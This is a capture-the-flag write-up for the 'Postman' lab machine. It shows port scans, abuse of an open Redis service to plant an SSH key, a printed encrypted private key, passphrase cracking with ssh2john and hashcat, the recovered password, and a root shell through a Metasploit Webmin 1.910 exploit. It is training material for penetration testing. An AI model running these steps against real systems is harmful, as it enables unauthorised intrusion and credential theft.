# recon
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)


PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website


PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
```
## port 80
- check only for html extension since the website is not running php
```
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/upload (Status: 301)
```
## port 10000 https
- webmin cli

# foot hold + redis
- https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce
- seem like we can upload webshell or smuggle ssh key. Sine the website is not runing php then we only have 1 chooice -> follow hacktricks [link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh): 
- redis-cli:
```
postman.htb:6379> CONFIG GET  *
166) "/var/lib/redis/.ssh"
```
there is a direcotry which we can put key inside. follow the guide on hacktricks and you should get a foothold!!

- linpeas.sh
```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2
.
.
[+] Searching ssl/ssh filess
/var/lib/redis/.ssh/authorized_keys
/usr/src/linux-headers-4.15.0-58/scripts/config /opt/id_rsa.bak   
Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow
.
.
Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
.
.
[+] Backup files?
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
.
.
root        733  0.0  3.1  95296 29332 ?        Ss   16:34   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf

```
- mat keys?
```
redis@Postman:~$ cd /opt/
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

# user
use ssh2john, follow by colabhash to crack the password. **NOTE do not run with python3!!!** there are some encoded error
```console
$ /usr/share/john/ssh2john.py id_rsa.bak > ssh_john.txt
```
now crack it using **colabhash**
```
hashcat -m 22911 -a 0 sshjohn.txt rockyou.txt -o cracked.txt
```
cracked after few sec,` Matt:computer2008` now time to ssh as Matt
```
┌──(kali㉿kali)-[~/HTB/postman]
└─$ ssh matt@postman.htb -i id_rsa.bak                                                                    255 ⨯
load pubkey "id_rsa.bak": invalid format
Enter passphrase for key 'id_rsa.bak': 
Connection closed by 10.10.10.160 port 22
```
hmm.. I tried like 3 times, it didnt works... seem like something is blocking us. So let `su` as Matt from our `redis` ssh session
```
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ 
```
# root
let grab user flag!!!, I try to do like sudo bypass vuln sine it is an old version. but it didnt work since Matt is not allow to execute any sudo command. I went back and read this note and notice that Webmin is running as root!!! I then try to connect to webmin with Matt credential and we got in. From the Webmin page I can see that it is runing `Webmin version 1.910`. After google googling for exploit I found
- https://www.exploit-db.com/exploits/46984
- https://github.com/KyleV98/Webmin-1.910-Exploit/blob/master/Webmin%201.910%20-%20Remote%20Code%20Execution%20using%20BurpSuite
- and metasploit module

I when for a easy way = metasploit module. If you want try harder way, then try out the github link or IPPsec did a vid about it too.
We will use `exploit/linux/http/webmin_packageup_rce` the opstion. execute it and got shell as root!!